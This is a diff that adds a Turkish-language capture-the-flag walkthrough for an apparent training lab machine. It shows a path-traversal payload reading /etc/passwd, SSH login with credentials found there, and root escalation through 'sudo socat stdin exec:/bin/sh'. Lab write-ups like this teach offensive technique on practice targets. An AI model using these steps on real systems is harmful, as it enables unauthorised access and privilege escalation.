@@ -40,3 +40,38 @@ Genel Olarak
 22 ssh portu
 80 http portudur
 Bu Durumda ilk olarak karşı web siteye gidebiliriz.
+Gittiğimiz Zaman Sayfada Arama Yaparak Nereye Yönlendirdiğine bakabiliriz, fakat hiç bir yere göndermediğini fark ediyoruz.
+O zaman sitede olan linklere bakalım...
+http://10.10.226.73/article?name=lfiattack
+burda lfiattack yere biz gitmek istediğimiz dizini yazmaya çalışalım.
+http://10.10.226.73/article?name=../../../etc/passwd
+Evet gidebiliyoruz o zaman site biraz karmaşık görünüyor onun için ctrl+u yaparak yani sayfa kaynağını görüntülüyerek daha düzgün bir çıktı elde edebiliriz
+view-source:http://10.10.226.73/article?name=../../../etc/passwd
+Burada 
+   > #falconfeast:rootpassword
+Diye bir satır var biraz dikkatimizi çekti gibi. Hatırlarsanız 22 ssh portuda açıktı bu bilgilerle bi ssha bağlanmaya çalışalım.
+evet ssh a bağlandık şimdi bakalım şu an ki dizinlerde neler var
+  > articles
+  > user.txt
+burdaki user.txt okuyabiliyoruz :)
+cat user.txt
+user.txt = 60XXXXXXXXXXXXXXXX99
+şmidi sıra geldi yetki yükseltmeye, makinemiz linux olduğundan sudo -l yazarak kullanabileceğimiz yetkilere bakabiliyoruz, bakalım hangi yetkilerimiz var.
+sudo -l
+Matching Defaults entries for falconfeast on inclusion:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User falconfeast may run the following commands on inclusion:
+    (root) NOPASSWD: /usr/bin/socat
+Burada Root yetkisikle socat i çalıştrabileceğimizi söylüyor o zaman biz gidip internetten socat ile ilgili yetki yükseltme komutlarına bakabiliriz :)
+Kullandığım site : https://gtfobins.github.io/gtfobins/socat/
+burada bize socat ile çalıştrabileceğimiz bağzı komutlara yer verilmiştir. Biz yetki yükseltmek istediğmiz için burada Sudo başlığı altındaki komutları kullanabiliriz.
+Sudo Başlığı altındaki komut :
+   > sudo socat stdin exec:/bin/sh
+  Bunu sudo ile yazmamızın sebebi sudo -l yazdığımızdan root yetkisiyle socat programını çalıştrabilceğizi söyledi onun için biz bu programı sudo ile çalıştırarak root yetkisine yükseldik :)
+  root flagini almak için : 
+  cat /root/root.txt
+  root.txt = 429XXXXXXXXXXXXXXXX09
+
+
